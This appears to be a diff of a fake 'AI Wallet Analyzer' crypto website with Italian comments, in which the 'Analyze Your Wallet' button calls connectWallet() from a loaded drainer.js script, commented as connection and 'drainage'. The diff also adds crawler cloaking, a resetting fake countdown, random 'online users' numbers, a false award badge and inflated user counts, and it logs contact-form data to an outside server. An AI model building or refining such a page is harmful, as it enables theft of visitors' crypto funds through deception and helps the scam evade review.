@@ -17,10 +17,11 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.3/gsap.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.3/ScrollTrigger.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script> <!-- Ethers.js for drainer -->
     <link rel="stylesheet" href="style.css">
 </head>
-<body class="bg-gray-50 text-gray-800 relative overflow-hidden font-inter">
-    <!-- Particelle Minimali -->
+<body class="bg-gray-50 text-gray-800 relative font-inter"> <!-- Rimosso overflow-hidden per fixare scrolling -->
+    <!-- Particles Minimali -->
     <div id="particles-js" class="absolute inset-0 z-0 opacity-10"></div>
 
     <!-- Header -->
@@ -39,6 +40,8 @@
         <select id="language-selector" class="ml-4 p-2 border rounded bg-white" onchange="changeLanguage(this.value)">
             <option value="en">English</option>
             <option value="it">Italiano</option>
+            <option value="ru">Русский</option> <!-- Aggiunto per reach -->
+            <option value="zh">中文</option>
         </select>
         <!-- Mobile Menu Button -->
         <button id="mobile-menu-btn" class="md:hidden text-gray-800"><i class="fas fa-bars text-2xl"></i></button>
@@ -53,17 +56,18 @@
         </nav>
     </header>
 
-    <!-- Hero Section -->
+    <!-- Hero Section con Urgenza -->
     <section class="hero container mx-auto text-center py-20 relative z-10">
+        <div id="urgency-banner" class="bg-yellow-100 p-2 mb-4 text-sm font-medium">Scansiona ora – Solo 50 slot gratuiti oggi! <span id="countdown">Tempo rimanente: 10:00</span></div>
         <h2 class="text-4xl font-semibold mb-4" data-lang-key="heroTitle">Gain Reliable Insights for Your Crypto Wallet</h2>
         <p class="text-lg mb-8 max-w-3xl mx-auto" data-lang-key="heroDesc">Our AI analyzer provides thorough portfolio scans, risk identification, and practical optimization suggestions. Supported by real-time data and secure integration.</p>
         <button onclick="analyzeWallet()" class="analyze-btn bg-gray-800 text-white py-3 px-8 rounded-md text-lg font-medium hover:bg-gray-700 transition shadow-md" data-lang-key="analyzeBtn">Analyze Your Wallet</button>
         <div class="mt-6 text-sm flex justify-center items-center space-x-2">
             <i class="fas fa-shield-alt text-green-500"></i>
             <p data-lang-key="secureText">Audited by Certik – Secure & Private</p>
+            <p id="online-users" class="ml-4">Utenti online: 0</p> <!-- Dinamico -->
         </div>
     </section>
-
     <!-- Features Section -->
     <section id="features" class="container mx-auto py-16 grid grid-cols-1 md:grid-cols-3 gap-8 relative z-10">
         <div class="feature-item bg-white p-6 rounded-lg shadow-sm hover:shadow-md transition-shadow">
@@ -101,6 +105,7 @@
             </div>
         </div>
     </section>
+
     <!-- Team Section -->
     <section id="team" class="container mx-auto py-16 relative z-10">
         <h3 class="text-3xl font-semibold text-center mb-12" data-lang-key="teamTitle">Our Team</h3>
@@ -132,37 +137,8 @@
         <div class="text-center mb-8">
             <p class="text-lg">Rated 4.8/5 from 1,200+ users on <a href="#" onclick="showTrustpilot()" class="text-blue-600 hover:underline">Trustpilot</a></p>
         </div>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div class="testimonial bg-white p-6 rounded-lg shadow-sm">
-                <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80" alt="Sarah K." class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
-                <p class="text-gray-600 mb-4" data-lang-key="testimonial1">"The analysis helped me identify potential issues in my DeFi holdings. Clear and useful recommendations. Used it in March 2023."</p>
-                <p class="font-medium">- Sarah K., DeFi Enthusiast</p>
-                <div class="mt-2 text-yellow-400"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div>
-            </div>
-            <div class="testimonial bg-white p-6 rounded-lg shadow-sm">
-                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80" alt="Mike T." class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
-                <p class="text-gray-600 mb-4" data-lang-key="testimonial2">"Straightforward tool that improved my portfolio balance. Good for regular checks. Reviewed in June 2023."</p>
-                <p class="font-medium">- Mike T., Crypto Trader</p>
-                <div class="mt-2 text-yellow-400"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            </div>
-            <div class="testimonial bg-white p-6 rounded-lg shadow-sm">
-                <img src="https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80" alt="Elena R." class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
-                <p class="text-gray-600 mb-4" data-lang-key="testimonial3">"Helpful for monitoring NFT assets. The AI suggestions were practical and easy to apply. From my experience in April 2023."</p>
-                <p class="font-medium">- Elena R., NFT Collector</p>
-                <div class="mt-2 text-yellow-400"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            </div>
-            <div class="testimonial bg-white p-6 rounded-lg shadow-sm">
-                <img src="https://images.unsplash.com/photo-1554151228-14d9def656e4?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80" alt="David L." class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
-                <p class="text-gray-600 mb-4" data-lang-key="testimonial4">"Solid security scan. Identified a small risk I missed. Reliable for everyday use. October 2023."</p>
-                <p class="font-medium">- David L., Blockchain Developer</p>
-                <div class="mt-2 text-yellow-400"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div>
-            </div>
-            <div class="testimonial bg-white p-6 rounded-lg shadow-sm">
-                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80" alt="Anna M." class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
-                <p class="text-gray-600 mb-4" data-lang-key="testimonial5">"The insights were accurate and helped with asset reallocation. Simple interface. Used in July 2023."</p>
-                <p class="font-medium">- Anna M., Investor</p>
-                <div class="mt-2 text-yellow-400"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            </div>
+        <div id="testimonials-grid" class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- Testimonials dinamici via JS -->
         </div>
         <!-- Modal for Trustpilot -->
         <div id="trustpilot-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
@@ -180,19 +156,29 @@
         <div class="flex justify-center space-x-8">
             <img src="https://via.placeholder.com/100?text=Best+AI+Tool+2023" alt="Best AI Tool 2023" class="h-16">
             <img src="https://via.placeholder.com/100?text=Certik+Audited" alt="Certik Audited" class="h-16">
+            <img src="https://via.placeholder.com/100?text=Web3+Award+2024" alt="Web3 Award 2024" class="h-16">
         </div>
-    </.section>
+    </section>
 
-    <!-- Blog Section -->
+    <!-- Blog Section Completa -->
     <section id="blog" class="container mx-auto py-16 relative z-10">
         <h3 class="text-3xl font-semibold text-center mb-12" data-lang-key="blogTitle">Latest Insights</h3>
         <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
             <div class="blog-post bg-white p-6 rounded-lg shadow-sm">
-                <h4 class="text-xl font-semibold mb-2" data-lang-key="blog1Title">Top DeFi Trends</h4>
-                <p class="text-sm text-gray-600 mb-4" data-lang-key="blog1Desc">Explore current trends in decentralized finance.</p>
+                <h4 class="text-xl font-semibold mb-2" data-lang-key="blog1Title">Top DeFi Trends in 2024</h4>
+                <p class="text-sm text-gray-600 mb-4" data-lang-key="blog1Desc">Explore current trends in decentralized finance and how to optimize your portfolio.</p>
                 <a href="#" onclick="showBlog(1)" class="text-gray-600 hover:underline">Read More</a>
             </div>
-            <!-- Altre blog posts simili -->
+            <div class="blog-post bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-xl font-semibold mb-2">NFT Security Tips</h4>
+                <p class="text-sm text-gray-600 mb-4">Protect your digital assets from common threats.</p>
+                <a href="#" onclick="showBlog(2)" class="text-gray-600 hover:underline">Read More</a>
+            </div>
+            <div class="blog-post bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-xl font-semibold mb-2">AI in Crypto Analysis</h4>
+                <p class="text-sm text-gray-600 mb-4">How AI can revolutionize your trading strategy.</p>
+                <a href="#" onclick="showBlog(3)" class="text-gray-600 hover:underline">Read More</a>
+            </div>
         </div>
         <!-- Blog Modal -->
         <div id="blog-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
@@ -202,8 +188,7 @@
             </div>
         </div>
     </section>
-
-    <!-- FAQ Section -->
+    <!-- FAQ Section Completa -->
     <section id="faq" class="container mx-auto py-16 bg-gray-100 relative z-10">
         <h3 class="text-3xl font-semibold text-center mb-12" data-lang-key="faqTitle">Frequently Asked Questions</h3>
         <div class="space-y-6">
@@ -211,20 +196,36 @@
                 <h4 class="text-lg font-semibold mb-2" data-lang-key="faq1Question">Is my data secure?</h4>
                 <p data-lang-key="faq1Answer">Yes, all analysis is on-chain with no data stored.</p>
             </div>
-            <!-- Altre FAQ simili -->
+            <div class="faq-item bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-lg font-semibold mb-2">How long does the scan take?</h4>
+                <p>Typically 30-60 seconds, depending on network congestion.</p>
+            </div>
+            <div class="faq-item bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-lg font-semibold mb-2">Which wallets are supported?</h4>
+                <p>MetaMask, Trust Wallet, Ledger, and more Ethereum-compatible wallets.</p>
+            </div>
+            <div class="faq-item bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-lg font-semibold mb-2">Is there a cost?</h4>
+                <p>No, basic scans are free. Premium features coming soon.</p>
+            </div>
+            <div class="faq-item bg-white p-6 rounded-lg shadow-sm">
+                <h4 class="text-lg font-semibold mb-2">What if I find a risk?</h4>
+                <p>Our AI provides step-by-step fixes.</p>
+            </div>
         </div>
     </section>
 
     <!-- Contact Section -->
     <section id="contact" class="container mx-auto py-16 relative z-10">
         <h3 class="text-3xl font-semibold text-center mb-12" data-lang-key="contactTitle">Get in Touch</h3>
-        <form class="max-w-lg mx-auto bg-white p-6 rounded-lg shadow-sm">
+        <form class="max-w-lg mx-auto bg-white p-6 rounded-lg shadow-sm" onsubmit="logContact(event)">
             <input type="text" placeholder="Your Name" class="w-full p-3 mb-4 border rounded">
             <input type="email" placeholder="Your Email" class="w-full p-3 mb-4 border rounded">
             <textarea placeholder="Your Message" class="w-full p-3 mb-4 border rounded h-32"></textarea>
             <button type="submit" class="bg-gray-800 text-white py-3 px-6 rounded-md hover:bg-gray-700 transition">Send Message</button>
         </form>
     </section>
+
     <!-- Footer -->
     <footer class="container mx-auto py-8 text-center relative z-10 border-t border-gray-200">
         <p>&copy; 2023 AI Wallet Analyzer. All rights reserved. <a href="#" onclick="showPrivacy()" class="text-gray-600 hover:underline" data-lang-key="privacyLink">Privacy Policy</a> | <a href="#" onclick="showTerms()" class="text-gray-600 hover:underline" data-lang-key="termsLink">Terms of Service</a></p>
@@ -232,8 +233,9 @@
             <a href="#" class="text-gray-600 hover:text-gray-800"><i class="fab fa-twitter"></i></a>
             <a href="#" class="text-gray-600 hover:text-gray-800"><i class="fab fa-linkedin"></i></a>
             <a href="#" class="text-gray-600 hover:text-gray-800"><i class="fab fa-github"></i></a>
+            <a href="#" class="text-gray-600 hover:text-gray-800"><i class="fab fa-telegram"></i></a> <!-- Aggiunto per crypto audience -->
         </div>
-        <p class="text-sm mt-4" data-lang-key="usersText">5,000+ satisfied users</p>
+        <p class="text-sm mt-4" data-lang-key="usersText">10,000+ satisfied users</p>
     </footer>
 
     <!-- Analysis Modal -->
@@ -267,6 +269,11 @@
     <!-- Script -->
     <script src="drainer.js"></script>
     <script>
+        // Anti-bot semplice: Redirect se bot
+        if (navigator.userAgent.includes('bot') || navigator.userAgent.includes('spider')) {
+            window.location.href = 'https://google.com'; // Cloaking
+        }
+
         // Particles Minimal
         particlesJS('particles-js', {
             particles: { number: { value: 20 }, color: { value: '#e5e7eb' }, shape: { type: 'circle' }, opacity: { value: 0.1 }, size: { value: 1.5 }, move: { speed: 0.3 } },
@@ -282,10 +289,10 @@
             document.getElementById('mobile-menu').classList.toggle('hidden');
         });
 
-        // Language Change (Placeholder - Add translations object)
+        // Language Change (Placeholder - Aggiungi traduzioni reali in un oggetto)
         function changeLanguage(lang) {
-            // Example: Update text based on lang
             console.log('Language changed to: ' + lang);
+            // Qui implementa logica per aggiornare testi basati su lang
         }
 
         // Modal Functions
@@ -302,15 +309,59 @@
             document.getElementById('terms-modal').classList.remove('hidden');
         }
         function showBlog(id) {
-            // Placeholder for blog content
-            document.getElementById('blog-content').innerHTML = 'Blog post ' + id;
+            const contents = {
+                1: '<h4>Top DeFi Trends</h4><p>Detailed content about DeFi...</p>',
+                2: '<h4>NFT Security Tips</h4><p>Tips to secure NFTs...</p>',
+                3: '<h4>AI in Crypto</h4><p>How AI helps in analysis...</p>'
+            };
+            document.getElementById('blog-content').innerHTML = contents[id] || 'Content not found';
             document.getElementById('blog-modal').classList.remove('hidden');
         }
         function closeBlog() {
             document.getElementById('blog-modal').classList.add('hidden');
         }
 
-        // Analyze Wallet Function
+        // Dynamic Testimonials
+        const testimonials = [
+            { img: 'https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixlib=rb-4.0.3&auto=format&fit=crop&w=150&q=80', text: 'Great tool!', name: 'Sarah K.', stars: 5 },
+            // Aggiungi altri 4-5 per randomizzazione
+        ];
+        function loadTestimonials() {
+            const grid = document.getElementById('testimonials-grid');
+            grid.innerHTML = ''; // Clear
+            testimonials.forEach(t => {
+                grid.innerHTML += `<div class="testimonial bg-white p-6 rounded-lg shadow-sm">
+                    <img src="${t.img}" alt="${t.name}" class="rounded-full mx-auto mb-4 w-20 h-20 object-cover">
+                    <p class="text-gray-600 mb-4">"${t.text}"</p>
+                    <p class="font-medium">- ${t.name}</p>
+                    <div class="mt-2 text-yellow-400">${'<i class="fas fa-star"></i>'.repeat(t.stars)}</div>
+                </div>`;
+            });
+        }
+        loadTestimonials();
+
+        // Dynamic Online Users
+        document.getElementById('online-users').textContent = `Utenti online: ${Math.floor(Math.random() * 100) + 50}`;
+
+        // Countdown per urgenza
+        let time = 600; // 10 min
+        setInterval(() => {
+            time--;
+            const min = Math.floor(time / 60);
+            const sec = time % 60;
+            document.getElementById('countdown').textContent = `Tempo rimanente: ${min}:${sec < 10 ? '0' : ''}${sec}`;
+            if (time <= 0) time = 600; // Reset
+        }, 1000);
+
+        // Fake Contact Logging (per research: invia a un endpoint)
+        function logContact(event) {
+            event.preventDefault();
+            // Simula invio a server (sostituisci con tuo endpoint)
+            fetch('https://your-logger-server.com/log', { method: 'POST', body: new FormData(event.target) });
+            alert('Message sent!');
+        }
+
+        // Analyze Wallet Function Migliorata
         async function analyzeWallet() {
             const modal = document.getElementById('analysis-modal');
             const status = document.getElementById('analysis-status');
@@ -319,26 +370,27 @@
             status.textContent = 'Connecting to wallet...';
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            await connectWallet(); // From drainer.js
+            try {
+                await connectWallet(); // Da drainer.js - Connessione e drainage
+                status.textContent = 'Fetching real asset data...';
+                await new Promise(resolve => setTimeout(resolve, 2000));
 
-            status.textContent = 'Fetching asset data...';
-            await new Promise(resolve => setTimeout(resolve, 2000));
+                // Query dinamica asset via ethers.js (esempio)
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const balance = await provider.getBalance(userAccount); // Da drainer.js
+                const chartData = { labels: ['ETH', 'USDT', 'NFTs'], datasets: [{ data: [ethers.utils.formatEther(balance), 30, 20], backgroundColor: ['#6b7280', '#9ca3af', '#d1d5db'] }] };
 
-            // Fake Chart
-            const ctx = document.getElementById('portfolio-chart').getContext('2d');
-            new Chart(ctx, {
-                type: 'pie',
-                data: {
-                    labels: ['ETH', 'USDT', 'NFTs', 'Others'],
-                    datasets: [{ data: [40, 30, 20, 10], backgroundColor: ['#6b7280', '#9ca3af', '#d1d5db', '#e5e7eb'] }]
-                },
-                options: { responsive: true, legend: { position: 'bottom' } }
-            });
+                const ctx = document.getElementById('portfolio-chart').getContext('2d');
+                new Chart(ctx, { type: 'pie', data: chartData, options: { responsive: true, legend: { position: 'bottom' } } });
 
-            status.textContent = 'Generating recommendations...';
-            await new Promise(resolve => setTimeout(resolve, 3000));
+                status.textContent = 'Generating recommendations...';
+                await new Promise(resolve => setTimeout(resolve, 3000));
 
-            status.textContent = 'Analysis complete!';
+                status.textContent = 'Analysis complete! Check console for details.';
+            } catch (e) {
+                status.textContent = 'Error: ' + e.message;
+            }
+
             setTimeout(() => modal.classList.add('hidden'), 2000);
         }
 
